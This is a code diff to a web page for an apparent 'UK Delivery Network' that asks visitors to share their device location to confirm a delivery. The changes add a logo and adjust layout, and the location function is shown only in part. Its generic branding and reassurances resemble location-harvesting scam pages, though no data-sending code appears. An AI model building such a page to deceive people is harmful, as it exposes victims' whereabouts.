@@ -28,6 +28,12 @@ body {
   box-shadow: 0 15px 40px rgba(0,0,0,0.25);
 }
 
+.logo img {
+  width: 150px;
+  max-width: 80%;
+  margin-bottom: 15px;
+}
+
 .logo {
   font-size: 28px;
   font-weight: bold;
@@ -88,8 +94,16 @@ button:hover {
 
 
 <div class="logo">
+
+<img src="https://raw.githubusercontent.com/UkDelivery/delivery-location/main/logo.png"
+alt="UK Delivery Network Logo">
+
+<div>
 UK Delivery Network
 </div>
+
+</div>
+
 
 
 <div class="tagline">
@@ -97,9 +111,11 @@ Fast • Reliable • Professional Delivery
 </div>
 
 
+
 <h2>
 Confirm your delivery location
 </h2>
+
 
 
 <p>
@@ -107,9 +123,11 @@ To help ensure your delivery arrives smoothly, please confirm your location.
 </p>
 
 
+
 <p>
 Your device will ask for permission. Your location is only used to complete this delivery.
 </p>
+
 
 
 <button onclick="getLocation()">
@@ -117,7 +135,9 @@ Your device will ask for permission. Your location is only used to complete this
 </button>
 
 
+
 <p id="status"></p>
+
 
 
 <div class="footer">
@@ -133,9 +153,7 @@ UK Delivery Network © 2026
 
 function getLocation(){
 
-
 const status = document.getElementById("status");
-
 
 
 if(!navigator.geolocation){
@@ -146,7 +164,6 @@ status.innerHTML =
 return;
 
 }
-
 
 
 status.innerHTML =
